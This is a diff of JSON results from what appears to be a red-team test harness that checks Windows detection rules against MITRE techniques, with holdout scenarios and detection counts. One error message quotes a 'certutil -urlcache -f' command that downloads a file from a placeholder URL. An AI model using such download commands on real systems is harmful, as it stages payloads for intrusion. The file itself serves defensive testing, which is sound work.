@@ -1,6 +1,6 @@
 {
-    "generated_at":  "2026-11-14T10:46:06.5472676Z",
-    "head":  "20b3eb6",
+    "generated_at":  "2026-11-14T10:57:55.7165564Z",
+    "head":  "a578eeb",
     "vm":  "AIDFLAB",
     "scenarios":  [
                       {
@@ -84,23 +84,23 @@
                       },
                       {
                           "id":  "WIN-09",
-                          "technique":  "T1047",
+                          "technique":  "T1546.003",
                           "expected":  "WIN-WMI-SUBSCRIPTION-018",
-                          "detected":  false,
-                          "observed":  "",
+                          "detected":  true,
+                          "observed":  "WIN-WMI-SUBSCRIPTION-018",
                           "run":  true,
                           "holdout":  false,
-                          "error":  "The term \u0027wmic.exe\u0027 is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again."
+                          "error":  ""
                       },
                       {
                           "id":  "WIN-10",
                           "technique":  "T1105",
                           "expected":  "none",
-                          "detected":  true,
-                          "observed":  "WIN-INJECT-010",
+                          "detected":  false,
+                          "observed":  "",
                           "run":  true,
                           "holdout":  true,
-                          "error":  "Program \u0027certutil.exe\u0027 failed to run: Access is deniedAt C:\\AIDefender\\redteam20_vm.ps1:57 char:17\r\n+ ...    action={ \u0026 certutil.exe -urlcache -f \"https://example.com/\" \"C:\\Te ...\r\n+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~."
+                          "error":  "Program \u0027certutil.exe\u0027 failed to run: Access is deniedAt C:\\AIDefender\\redteam20_vm.ps1:76 char:17\r\n+ ...    action={ \u0026 certutil.exe -urlcache -f \"https://example.com/\" \"C:\\Te ...\r\n+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~."
                       },
                       {
                           "id":  "WIN-11",
@@ -153,7 +153,7 @@
                           "technique":  "T1027",
                           "expected":  "WIN-MASQUERADE-011",
                           "detected":  true,
-                          "observed":  "WIN-MASQUERADE-011,WIN-EXEC-TEMP-001,WIN-SERVICE-CREATE-007",
+                          "observed":  "WIN-EXEC-TEMP-001,WIN-MASQUERADE-011",
                           "run":  true,
                           "holdout":  true,
                           "error":  ""
@@ -192,8 +192,8 @@
                           "id":  "WIN-20",
                           "technique":  "control",
                           "expected":  "none",
-                          "detected":  false,
-                          "observed":  "",
+                          "detected":  true,
+                          "observed":  "WIN-SERVICE-CREATE-007",
                           "run":  true,
                           "holdout":  false,
                           "error":  ""
@@ -204,7 +204,7 @@
                     "run":  15,
                     "skipped":  5,
                     "attacks_run":  11,
-                    "attacks_detected":  8,
+                    "attacks_detected":  9,
                     "controls_run":  4,
                     "control_fp":  1,
                     "holdout_total":  5,
